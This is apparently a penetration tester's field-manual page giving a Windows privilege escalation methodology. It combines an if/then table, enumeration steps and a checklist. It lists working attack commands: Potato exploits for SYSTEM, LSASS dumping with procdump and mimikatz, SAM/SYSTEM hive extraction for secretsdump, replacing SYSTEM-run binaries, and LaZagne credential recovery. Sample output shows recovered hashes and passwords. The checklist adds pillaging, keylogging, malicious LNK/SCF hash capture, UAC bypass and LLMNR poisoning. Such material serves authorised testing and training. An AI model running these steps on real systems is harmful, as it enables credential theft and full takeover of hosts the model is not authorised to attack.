---
icon: microsoft
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Windows Privilege Escalation

## If / Then Guide

| If you have / find...                                      | ...Focus on...                                                                                                                                                                                                                                                                                                                    | ...and perform these Actions                                |
| ---------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` | [seimpersonateprivilege-exploitation](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/seimpersonateprivilege-exploitation/ "mention")                                                                                                                                                                    | Potato attack (PrintSpoofer / GodPotato) → SYSTEM           |
| `SeDebugPrivilege`                                         | [sedebugprivilege-exploitation.md](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/sedebugprivilege-exploitation.md "mention")                                                                                                                                                                           | Dump LSASS (procdump + mimikatz) for credentials            |
| `SeBackupPrivilege` / `SeRestorePrivilege`                 | [weak-permissions.md](../field-manual/post-exploitation/privilege-escalation-1/weak-permissions.md "mention")                                                                                                                                                                                                                     | Read SAM + SYSTEM hives → secretsdump                       |
| `SeTakeOwnershipPrivilege`                                 | [setakeownershipprivlege-exploitation.md](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/setakeownershipprivlege-exploitation.md "mention")                                                                                                                                                             | Take ownership of a SYSTEM-run binary/file, then replace it |
| Member of **Backup Operators**                             | [backup-operators.md](../field-manual/post-exploitation/privilege-escalation-1/group-privileges/backup-operators.md "mention")                                                                                                                                                                                                    | Back up SAM/SYSTEM → extract hashes                         |
| Member of **DnsAdmins**                                    | [dnsadmins.md](../field-manual/post-exploitation/privilege-escalation-1/group-privileges/dnsadmins.md "mention")                                                                                                                                                                                                                  | Load a malicious DLL via the DNS service → SYSTEM           |
| Member of **Server Operators**                             | [server-operators.md](../field-manual/post-exploitation/privilege-escalation-1/group-privileges/server-operators.md "mention")                                                                                                                                                                                                    | Reconfigure a service binPath → SYSTEM                      |
| Member of **Print Operators**                              | [print-operators.md](../field-manual/post-exploitation/privilege-escalation-1/group-privileges/print-operators.md "mention")                                                                                                                                                                                                      | `SeLoadDriverPrivilege` → vulnerable driver load            |
| Member of **Event Log Readers** / **Hyper-V Admins**       | <ul><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation-1/group-privileges/event-log-readers.md">event-log-readers.md</a></li><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation-1/group-privileges/hyper-v-administrators.md">hyper-v-administrators.md</a></li></ul> | Read logs for creds / abuse VM management                   |
| **Unquoted service path** with a writable directory        | [weak-permissions.md](../field-manual/post-exploitation/privilege-escalation-1/weak-permissions.md "mention")                                                                                                                                                                                                                     | Plant a binary in the path → restart the service            |
| **Weak service permissions** (`SERVICE_CHANGE_CONFIG`)     | [weak-permissions.md](../field-manual/post-exploitation/privilege-escalation-1/weak-permissions.md "mention")                                                                                                                                                                                                                     | `sc config <svc> binPath=` to your payload → SYSTEM         |
| **AlwaysInstallElevated = 1** (HKLM **and** HKCU)          | [weak-permissions.md](../field-manual/post-exploitation/privilege-escalation-1/weak-permissions.md "mention")                                                                                                                                                                                                                     | Install a malicious MSI → SYSTEM                            |
| **cmdkey saved credentials**                               | [credential-hunting.md](../field-manual/intelligence/windows-host-enumeration/credential-hunting.md "mention")                                                                                                                                                                                                                    | `runas /savecred` as the stored user                        |
| **Unpatched kernel / EOL OS**                              | <ul><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation-1/kernel-exploits/">kernel-exploits</a></li><li><a data-mention href="../field-manual/post-exploitation/privilege-escalation/linux-internals/kernel-exploitation.md">kernel-exploitation.md</a></li></ul>                                    | Match systeminfo to a kernel exploit (Watson / WES-NG)      |
| **UAC present, admin in medium integrity**                 | [user-account-control.md](../field-manual/post-exploitation/privilege-escalation-1/user-account-control.md "mention")                                                                                                                                                                                                             | UAC bypass (fodhelper etc.) to a high-integrity shell       |
| **.vhd / .vhdx / .vmdk present**                           | [attacking-sam-system-and-security.md](../field-manual/post-exploitation/privilege-escalation-1/windows-authentication/attacking-sam-system-and-security.md "mention")                                                                                                                                                            | Mount the image → extract SAM/SYSTEM                        |

***

## Automated Enumeration

{% stepper %}
{% step %}
#### WinPEAS

Run winpeas first for broad coverage; save the output and review it offline.

```powershell
.\winPEASx64.exe log=winpeas.txt
```

<mark style="color:$primary;">**What to look for:**</mark> anything [winpeas.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/winpeas.md "mention") highlights in <mark style="color:$danger;">**red**</mark>**/**<mark style="color:$warning;">**yellow**</mark> - it flags the likely wins: enabled token privileges, writable service paths, AlwaysInstallElevated, stored credentials, unquoted paths.

```
[+] Checking AlwaysInstallElevated
    AlwaysInstallElevated set to 1 in HKLM!
[+] Modifiable Services
    VulnSvc: YOU CAN MODIFY THIS SERVICE -> SERVICE_CHANGE_CONFIG
```

<mark style="color:$primary;">**Next:**</mark> treat each highlighted finding as a lead and jump to the matching section below; don't stop at [winpeas.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/winpeas.md "mention") - confirm manually.

* [ ] Complete
{% endstep %}

{% step %}
#### Seatbelt

Run seatbelt for a structured .NET-based host survey that catches things [winpeas.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/winpeas.md "mention") presents differently.

```powershell
.\Seatbelt.exe -group=all -outputfile=seatbelt.txt
```

<mark style="color:$primary;">**What to look for:**</mark> credential-bearing sections - `WindowsCredentialFiles`, `WindowsVault`, `CredEnum`, saved RDP/PuTTY sessions, and token privileges.

<mark style="color:$primary;">**Next:**</mark> correlate with WinPEAS; cross-confirmed findings are your strongest leads.

* [ ] Complete
{% endstep %}

{% step %}
#### PowerUp / SharpUp

Run [powerup.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/powerup.md "mention") (PowerShell) or [sharpup.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/sharpup.md "mention") (.NET) for service and permission misconfigurations specifically.

```powershell
powershell -ep bypass
. .\PowerUp.ps1 ; Invoke-AllChecks
```

<mark style="color:$primary;">**What to look for:**</mark> `AbuseFunction` lines - PowerUp hands you the exact follow-up command for each finding.

```
ServiceName   : VulnSvc
AbuseFunction : Invoke-ServiceAbuse -Name 'VulnSvc'
```

<mark style="color:$primary;">**Next:**</mark> use the suggested AbuseFunction, or escalate manually via the Service/Permission section.

* [ ] Complete
{% endstep %}

{% step %}
#### Credential & Session Hunters

Run [lazagne.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/lazagne.md "mention") (stored app creds), sessiongopher (saved PuTTY/RDP/WinSCP sessions) and jaws (PowerShell survey for older hosts).

```powershell
.\lazagne.exe all
```

<mark style="color:$primary;">**What to look for:**</mark> recovered browser/app/Wi-Fi credentials and saved remote-session secrets.

```
[+] Password found !!!
Login: svc_deploy
Password: Summer2022!
```

<mark style="color:$primary;">**Next:**</mark> test every recovered credential locally and across the domain.

* [ ] Complete
{% endstep %}

{% step %}
#### Kernel Exploit Suggesters

Feed `systeminfo` to [watson.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/watson.md "mention") or [windows-exploit-suggester-ng.md](../toolbox/tooling/information-gathering/windows-enumeration/privilege-escalation/windows-exploit-suggester-ng.md "mention") to map missing patches to kernel exploits.

{% code title="Target Host" %}
```powershell
systeminfo > systeminfo.txt
```
{% endcode %}

{% code title="Attack Host" %}
```bash
wesng -i systeminfo.txt
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> suggested CVEs with public exploits and a matching OS build/patch level.

```
[*] MS16-032: Secondary Logon Handle - Critical - Exploit available
```

<mark style="color:$primary;">**Next:**</mark> only chase kernel exploits once config-based routes are exhausted - see the Exploits section.

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Manual Situational Awareness

{% stepper %}
{% step %}
#### System Enumeration

Identify the exact OS build, patch level and architecture - these decide which kernel/OS exploits apply.

```bash
systeminfo
```

<mark style="color:$primary;">**What to look for:**</mark> `OS Version`, `System Type` (x64/x86), and the `Hotfix(s)` count - few hotfixes on an old build hints at kernel-exploit potential.

```
OS Name:         Microsoft Windows Server 2016 Standard
OS Version:      10.0.14393 N/A Build 14393
Hotfix(s):       2 Hotfix(s) Installed.
```

<mark style="color:$primary;">**Next:**</mark> feed this to the exploit suggesters above.

* [ ] Complete
{% endstep %}

{% step %}
#### User & Group Context

Establish who you are, your integrity level and your group memberships.

```bash
whoami /all
net user <user>
net localgroup administrators
```

<mark style="color:$primary;">**What to look for:**</mark> your integrity level (Medium vs High), and membership of any privileged local/domain group.

<mark style="color:$primary;">**Next:**</mark> enabled privileges > _Token Abuse_; group membership > _Group Membership_.

* [ ] Complete
{% endstep %}

{% step %}
#### Network Enumeration

Map interfaces, routes and neighbours - a second NIC often means a path into another subnet.

```bash
ipconfig /all
arp -a
route print
```

<mark style="color:$primary;">**What to look for:**</mark> additional NICs on other subnets, and ARP neighbours you haven't seen from outside.

<mark style="color:$primary;">**Next:**</mark> a second NIC > pivot from this host (see _Internal Services & Pivoting_).

* [ ] Complete
{% endstep %}

{% step %}
#### Process & Service Enumeration

List running processes and services to spot third-party software and service-based escalation paths.

```bash
tasklist /svc
wmic service get name,displayname,pathname,startmode
```

<mark style="color:$primary;">**What to look for:**</mark> non-Microsoft services, services running as SYSTEM with binaries in writable locations, and AV/EDR processes.

<mark style="color:$primary;">**Next:**</mark> feed service findings into the Service/Permission section.

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Privileges - Token Abuse

{% stepper %}
{% step %}
#### Review Enabled Privileges

List your token privileges - several are direct routes to SYSTEM.

```bash
whoami /priv
```

<mark style="color:$primary;">**What to look for:**</mark> any of these **Enabled**: `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`.

```
SeImpersonatePrivilege   Impersonate a client after authentication  Enabled
SeDebugPrivilege         Debug programs                             Enabled
```

<mark style="color:$primary;">**Next:**</mark> jump to the matching step below for whichever privilege is enabled.

* [ ] Complete
{% endstep %}

{% step %}
#### SeImpersonate / SeAssignPrimaryToken

Abuse impersonation with a Potato attack ( [juicypotato.md](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/seimpersonateprivilege-exploitation/juicypotato.md "mention") ) to run a command as SYSTEM. Common on service accounts and IIS/MSSQL contexts. See [seimpersonateprivilege-exploitation](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/seimpersonateprivilege-exploitation/ "mention").

```bash
.\PrintSpoofer64.exe -i -c cmd
```

```bash
.\GodPotato.exe -cmd "cmd /c whoami"
```

<mark style="color:$primary;">**What to look for:**</mark> the spawned shell/command returning `nt authority\system`.

```
nt authority\system
```

<mark style="color:$primary;">**Next:**</mark> we have SYSTEM - dump credentials (LSASS / SAM) and move on.

* [ ] Complete
{% endstep %}

{% step %}
#### SeDebugPrivilege

Use debug rights to dump LSASS and extract credentials. See [sedebugprivilege-exploitation.md](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/sedebugprivilege-exploitation.md "mention").

{% code title="Target Host" %}
```bash
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Attacker Host" %}
```bash
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> plaintext passwords or NT hashes for logged-on users in the [mimikatz.md](../toolbox/tooling/post-exploitation/mimikatz.md "mention") output.

```
Username : admin
NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
```

<mark style="color:$primary;">**Next:**</mark> reuse recovered creds/hashes for lateral movement or domain escalation.

* [ ] Complete
{% endstep %}

{% step %}
#### SeBackup / SeRestore

Backup rights let you read protected files - copy out the SAM and SYSTEM hives. See [weak-permissions.md](../field-manual/post-exploitation/privilege-escalation-1/weak-permissions.md "mention").

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
# attacker: secretsdump.py -sam sam.save -system system.save LOCAL
```

<mark style="color:$primary;">**What to look for:**</mark> the local account hashes dumped by secretsdump.

```
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931...:::
```

<mark style="color:$primary;">**Next:**</mark> pass-the-hash the local Administrator across other hosts.

* [ ] Complete
{% endstep %}

{% step %}
#### SeTakeOwnership

Take ownership of a file a privileged process uses, then replace it. See [setakeownershipprivlege-exploitation.md](../field-manual/post-exploitation/privilege-escalation-1/user-privileges/setakeownershipprivlege-exploitation.md "mention").

```bash
takeown /f "C:\Path\To\target.exe"
icacls "C:\Path\To\target.exe" /grant <user>:F
```

<mark style="color:$primary;">**What to look for:**</mark> ownership/ACL change succeeding, giving you write access to a binary that runs as SYSTEM.

<mark style="color:$primary;">**Next:**</mark> replace the file with your payload and trigger it.

* [ ] Complete
{% endstep %}
{% endstepper %}

***



***



1. Run Windows privilege escalation scripts. Save the output to a file and transfer it to host for examination.
   * WinPeas
   * Searbelt
   * PowerUp / StartUp
   * JAWS - recommended by Ippsec, uses PS.
   * SessionGopher
   * Bloodhound
2. Perform basic enumeration.
   * Network enumeration.
   * System enumeration
   * Process enumeration
   * User and group enumeration.
3. Look at access rights of current user.
   * `whoami /priv`
   * Windows privileges.
   * SeImpersonate / SeAssignPrimaryToken
   * SeDebugPrivilege
   * SeTakeOwnershipPrivilege
4. Check if current user is a member of privileged groups.
   * whoami /groups
   * Backup opreators
   * event log readers
   * DmsAdmins
   * Hyper-V Admins
   * Print Operators
   * Server Operators.
5. Check for weak file / service permissions.
   * Permissive File System ACLs.
   * Weak service permissions.
   * Unquoted service path.
   * Permissive registry ACLs.
   * Modifiable registry autorun binary.
6. Check for saved credentials.
   * CmdKey saved credentials
   * `cmdkey /list`
   * If access gained, run [mimikatz.md](../toolbox/tooling/post-exploitation/mimikatz.md "mention") to attempt extracting plaintext password.
7. Look for services running on internal ports that were not accessible externally with netstat.
   * Databases?
   * `netstat -ano`
   * services
8. Check for additional NICs using commands like ipconfig.
9. Look for vulnerable applications and services.
   1. `wmic product get name`
10. Look for interesting files on the server that may have credentials or other sensitive information.
    * Credential hunting
    * further credential theft
    * dumping hashes / credentials
    * mimikatz
11. Pillage for credentials or other interesting information
    * pillaging
    * pillaging applicaitons
    * accessing instant message clients through cookies
    * pillaging the clipboard + keylogging
    * pilaging backups
12. look for scheduled tasks that can be modified
13. Look for credentials in process command line
14. Check for 'always install elevated' setting and exploit with MSI package.
15. Capture hashes with a Malicious LINK file of SCF file.
    * Capturing hashes with malicious .lnk file.
    * capture hashes with SCF on a file share ( < windows server 2019 ).
16. Look for Kernel / OS exploits.
    * Kernel exploits
    * EOL System exploits.
17. Attempt to bypass UAC controls if present.
    * UAC attacks.
18. DLL Injection
19. Common OS and program vulnerabilities.
    * Windows certificate dialog (CVE-2019-1388)
20. Attempt to capture network traffic with Inveigh or Responder, wireshark or snaffler.
    * LLMNR/NBT-NS poisoning
21. Enumerate user, computer desicpriotn fields for cleartext credentials or other information.
22. If the system has .vhd, .vhdx, and .vmdk files, mount them to potentially dump machine hashses.
    * Mount VHDX/VMDK
